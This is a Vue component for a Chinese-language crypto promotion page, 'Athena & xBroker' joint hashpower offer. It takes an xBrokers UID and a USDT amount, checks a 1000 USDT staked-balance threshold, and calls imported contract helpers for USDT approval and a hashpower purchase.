<template>
    <section class="section-cta">
        <!-- == Head Section -->
        <div class="sect-header">
            <div class="container">
                <div class="s-meta text-caption font-2">
                    <p class="s-number_order wg-counter">
                        [ <span class="text-white">0<span class="odometer" data-number="8">0</span></span> / 09 ]
                    </p>
                    <p class="s-label">[ <span class="text-white hacker-text_transform">CTA</span> ]</p>
                </div>
            </div>
        </div>
        <span class="br-line"></span>
        <!-- == Tagline Section -->
        <div class="sect-tagline">
            <div class="container">
                <div class="sect-tagline_inner">
                    <span class="hafl-plus pst-left_bot wow bounceInScale"></span>
                    <span class="hafl-plus pst-right_bot wow bounceInScale"></span>
                    <h6 class="s-name text-caption font-2">
                        <span class="bar-group type-left">
                            <span class="bar_center"></span>
                        </span>
                        <span class="hacker-text_transform no-delay">
                            GET STARTED TODAY.
                        </span>
                        <span class="bar-group type-right">
                            <span class="bar_center"></span>
                        </span>
                    </h6>
                </div>
            </div>
        </div>
        <span class="br-line"></span>
        <!-- == Main Section -->
        <div class="sect-main position-relative">
            <div class="s-img_item">
                <img class="lazyload" src="/asset/images/section/color-bg-2.webp"
                    data-src="/asset/images/section/color-bg-2.webp" alt="BG">
            </div>
            <div class="container">
                <div class="sect-title wow fadeInUp">
                    <h2 class="s-title font-3" style="color: #fff;">
                        Athena & xBroker<br>
                        联合算力特惠活动
                    </h2>
                    <p class="s-sub_title">
                        在 Athena 用同样的钱，投资效率翻4倍 <br>
                        xBrokers官方战略合作
                    </p>
                </div>
                <div class="px-16 px-sm-0" id="ad-platform">
                    <div class="row justify-content-center">
                        <div class="col-11 col-md-8 col-xl-6">
                            <div class="ad-platform-form">
                                <div class="form-group">
                                    <label class="form-label">xBrokers UID</label>
                                    <input 
                                        type="text" 
                                        inputmode="numeric"
                                        class="form-input" 
                                        placeholder="输入 UID"
                                        :value="xbrokersUid"
                                        @input="handleUidInput"
                                    />
                                </div>
                                <div class="form-group">
                                    <label class="form-label">投资金额</label>
                                    <input 
                                        type="text" 
                                        inputmode="decimal"
                                        class="form-input" 
                                        placeholder="输入数量"
                                        :value="investAmount"
                                        @input="handleAmountInput"
                                    />
                                    <div class="hashpower-info">
                                        <span v-if="computedHashpower">≈ {{ computedHashpower }} 算力</span>
                                    </div>
                                </div>
                                <div class="button-group">
                                    <a href="#" @click.prevent="handleSubmit" 
                                        class="btn-ip ip-modern text-body-3 btn-confirm"
                                        :class="{ 'btn-disabled': mainButtonState.disabled }">
                                        {{ mainButtonState.text }}
                                    </a>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="row" style="margin: 20px 0 50px 0;">
                    <div class="col-11 col-md-8 col-xl-4 mx-auto">
                        <p class="form-note text-center">
                            xBrokers · 全球化金融服务平台<br>让资本的流动更加自由、透明和高效
                        </p>
                    </div>
                </div>
                <div class="position-relative has-hafl_plus">
                    <span class="hafl-plus pst-left_bot item_bot wow bounceInScale"></span>
                    <span class="hafl-plus pst-right_bot item_bot wow bounceInScale"></span>
                </div>
            </div>
        </div>
        <span class="br-line"></span>
        <!-- == Bottom Section -->
        <div class="sect-bottom">
            <div class="container">
                <div class="box-hacker has-overlay_linear">
                    <p class="hacker-text text-caption font-2 text-uppercase hackerText">
                        qW8bL2nRM4ZpYk5gJfXvCt1uHdEo93NTaVxBYmOe7rPQnKDlcUs0AjzhFiGSwLXtRpUo6NMJvqa7bT2EfyCdx9KWZhgL1nFMR3YUJ5toepXAGvqBzNcdwskLm4iT7OPuVHxayJZErm5QbgCnX1UL2D9ptYfOEK0sWhRAgJmzliNu67BXFoQYPCHtvnwMJeaZKRxdo3TfLUGqc48sbE9NYpJAgmWTVrhXxLFo517zkidC3
                    </p>
                </div>
            </div>
        </div>
        <span class="br-line"></span>
    </section>
</template>
<script>
import {
    showToast
} from '../services/notification';
import {
    walletState
} from '../services/wallet';
import {
    getUsdtAllowanceForPowerPurchase,
    approveUsdtForPowerPurchase,
    purchasePower,
    getUserStakedBalance
} from '../services/contracts';

export default {
    name: 'CTASection',
    data() {
        return {
            xbrokersUid: '',
            investAmount: '',
            hashpowerRate: 4, // Conversion rate: 1 USDT = 4 hashpower
            usdtAllowance: '0',
            isApproving: false,
            isSubmitting: false,
            walletState: walletState,
            userStakedBalance: '0',
            isLoadingBalance: true,
        }
    },
    computed: {
        mainButtonState() {
            if (!this.walletState.address) {
                return {
                    text: '连接钱包',
                    action: 'connect',
                    disabled: false
                };
            }
            if (this.isLoadingBalance) {
                return {
                    text: '读取资产中...',
                    action: 'loading',
                    disabled: true
                };
            }
            if (parseFloat(this.userStakedBalance) < 1000) {
                return {
                    text: '需达到 1000USDT 资产额度',
                    action: 'insufficient',
                    disabled: true
                };
            }
            if (this.isApproving) {
                return {
                    text: '授权中...',
                    action: 'approving',
                    disabled: true
                };
            }
            if (this.isSubmitting) {
                return {
                    text: '请求提交中...',
                    action: 'submitting',
                    disabled: true
                };
            }

            const amountNum = parseFloat(this.investAmount);
            const allowanceNum = parseFloat(this.usdtAllowance);

            if (!this.investAmount || amountNum <= 0) {
                return {
                    text: '确定投资',
                    action: 'submit',
                    disabled: true
                };
            }

            if (allowanceNum < amountNum) {
                return {
                    text: '授权 USDT',
                    action: 'approve',
                    disabled: false
                };
            }

            return {
                text: '确定投资',
                action: 'submit',
                disabled: false
            };
        },
        computedHashpower() {
            const amount = parseFloat(this.investAmount);
            if (isNaN(amount) || amount <= 0) {
                return '';
            }
            const hashpower = amount * this.hashpowerRate;
            return hashpower.toLocaleString('en-US', {
                minimumFractionDigits: 2,
                maximumFractionDigits: 2
            });
        }
    },
    watch: {
        'walletState.address'(newAddress) {
            if (newAddress) {
                this.fetchData();
            } else {
                this.usdtAllowance = '0';
                this.userStakedBalance = '0';
                this.isLoadingBalance = false;
            }
        },
    },
    methods: {
        async fetchData() {
            if (!walletState.address) return;
            this.isLoadingBalance = true;
            await Promise.all([
                this.fetchUsdtAllowance(),
                this.fetchUserStakedBalance()
            ]);
            this.isLoadingBalance = false;
        },
        async fetchUserStakedBalance() {
            this.userStakedBalance = await getUserStakedBalance();
        },
        async fetchUsdtAllowance() {
            if (!walletState.address) return;
            this.usdtAllowance = await getUsdtAllowanceForPowerPurchase();
        },
        handleUidInput(event) {
            let value = event.target.value;
            // Only allow digits (0-9)
            value = value.replace(/[^0-9]/g, '');
            this.xbrokersUid = value;
        },
        handleAmountInput(event) {
            let value = event.target.value;
            // Only allow digits and decimal point
            value = value.replace(/[^0-9.]/g, '');
            // Ensure only one decimal point
            const parts = value.split('.');
            if (parts.length > 2) {
                value = parts[0] + '.' + parts.slice(1).join('');
            }
            this.investAmount = value;
        },
        async handleSubmit() {
            if (this.mainButtonState.disabled) return;

            const action = this.mainButtonState.action;

            if (action === 'connect') {
                showToast('请先连接钱包');
                this.$emit('connect-wallet');
                return;
            }

            // --- Validation Logic ---
            if (!this.xbrokersUid.trim()) {
                showToast('请输入 xBrokers UID');
                return;
            }
            if (!this.investAmount.trim()) {
                showToast('请输入投资金额');
                return;
            }
            const amount = parseFloat(this.investAmount);
            if (isNaN(amount) || amount <= 0) {
                showToast('请输入有效的投资金额');
                return;
            }

            switch (action) {
                case 'approve':
                    this.isApproving = true;
                    try {
                        const success = await approveUsdtForPowerPurchase();
                        if (success) {
                            showToast('授权成功');
                            await this.fetchUsdtAllowance();
                        } else {
                            // Error toast is shown inside approve function for rejection
                        }
                    } finally {
                        this.isApproving = false;
                    }
                    break;
                case 'submit':
                    this.isSubmitting = true;
                    try {
                        const success = await purchasePower(this.xbrokersUid, this.investAmount);
                        if (success) {
                            showToast('已提交投资请求，请稍后在聚币APP中查看');
                            this.xbrokersUid = '';
                            this.investAmount = '';
                            // Reload the page after a short delay to allow the user to see the toast.
                            setTimeout(() => {
                                window.location.reload();
                            }, 1500);
                        } else {
                            // Error toast is shown inside purchasePower function
                        }
                    } finally {
                        this.isSubmitting = false;
                    }
                    break;
            }
        }
    },
    mounted() {
        if (walletState.address) {
            this.fetchData();
        } else {
            this.isLoadingBalance = false;
        }
        window.REQUIRED_CODE_ERROR_MESSAGE = 'Please choose a country code';
        window.LOCALE = 'en';
        window.EMAIL_INVALID_MESSAGE = window.SMS_INVALID_MESSAGE = "The information provided is invalid. Please review the field format and try again.";
        window.REQUIRED_ERROR_MESSAGE = "This field cannot be left blank. ";
        window.GENERIC_INVALID_MESSAGE = "The information provided is invalid. Please review the field format and try again.";
        window.translation = {
            common: {
                selectedList: '{quantity} list selected',
                selectedLists: '{quantity} lists selected'
            }
        };
        window.AUTOHIDE = Boolean(0);

        const script = document.createElement('script');
        script.src = '/asset/js/sibforms.js';
        document.body.appendChild(script);
    }
}
</script>
<style scoped>
.ad-platform-form {
    padding: 2rem;
    background: var(--bg-2);
    border: 1px solid var(--line);
    border-radius: 28px;
    backdrop-filter: blur(16px);
}

.form-group {
    margin: 20px 0 20px 0;
}

.form-label {
    display: block;
    text-align: left;
    color: var(--text-2);
    margin-bottom: 10px;
    font-size: 14px;
    padding-left: 5px;
}

.form-input {
    width: 100%;
    padding: 15px 20px;
    background-color: #0c0c0e;
    border: 1px solid var(--line);
    border-radius: 12px;
    color: var(--white);
    font-size: 16px;
    -webkit-appearance: none;
    -moz-appearance: none;
    appearance: none;
}

.form-input:focus {
    outline: none;
    border-color: var(--primary);
}

.hashpower-info {
    margin-top: 8px;
    text-align: left;
    padding-left: 5px;
    color: var(--primary);
    font-size: 14px;
    min-height: 20px;
    line-height: 20px;
}

.button-group {
    display: flex;
    justify-content: center;
    gap: 15px;
    margin-top: 30px;
}

.btn-ip {
    flex: 1;
    max-width: 200px;
    text-align: center;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 8px;
    background: linear-gradient(0deg, rgba(20, 20, 21, 0.82), rgba(20, 20, 21, 0.82)),
        linear-gradient(180deg, rgba(255, 255, 255, 0.04) 0%, rgba(255, 255, 255, 0) 100%);
    border: 1px solid var(--line);
    box-shadow: 0px 1px 1px 0px #FFFFFF2E inset, 0px 0px 4px 0px #FFFFFF0F inset, 0px 0px 8px 0px #FFFFFF14 inset, 0px 0px 16px 0px #FFFFFF1F inset;
    padding: 12px;
    border-radius: 999px;
    transition: all .3s ease;
    color: var(--text-2);
    text-decoration: none;
}

.btn-ip:hover {
    color: var(--primary);
    border-color: var(--primary);
}

.btn-confirm {
    color: var(--white);
    background: var(--primary);
    border-color: var(--primary);
}

.btn-confirm:hover {
    color: var(--white);
    filter: brightness(1.1);
}

.btn-disabled {
    opacity: 0.5;
    cursor: not-allowed;
    filter: grayscale(50%);
}

@media (max-width: 768px) {
    .ad-platform-form {
        padding: 1.5rem;
    }
    
    .form-input {
        padding: 12px 16px;
        font-size: 14px;
    }
    
    .btn-ip {
        max-width: 100%;
        padding: 10px;
    }
}
</style>
